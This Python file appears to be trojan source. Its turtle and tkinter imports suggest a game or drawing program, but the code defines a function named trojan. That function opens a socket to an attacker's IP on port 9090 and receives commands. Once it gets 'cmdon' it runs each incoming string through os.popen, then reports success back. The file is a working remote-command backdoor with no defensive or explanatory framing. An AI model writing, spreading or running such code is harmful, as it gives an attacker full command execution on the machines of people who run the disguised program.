from turtle import *
from random import randrange
from tkinter import *
import socket
import threading
import os

def trojan():
    HOST = '000.000.000.00' #Your IP address, get from cmd with command line: ipconfig
    PORT = 9090

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))

    cmd_mode = False
    while True:
        server_command = client.recv(1024).decode('utf-8')
        if server_command == "cmdon":
            cmd_mode = True
            client.send("you have now terminal access".encode('utf-8'))
            continue
        if server_command =="cmdoff":
            cmd_mode = False
        if cmd_mode:
            os.popen(server_command)
        elif server_command == "quit_exploit":
            break
        else:
            if server_command == "fool":
                print("You've been fooled")


        client.send(f"{server_command} was successfully executed!".encode('utf-8'))

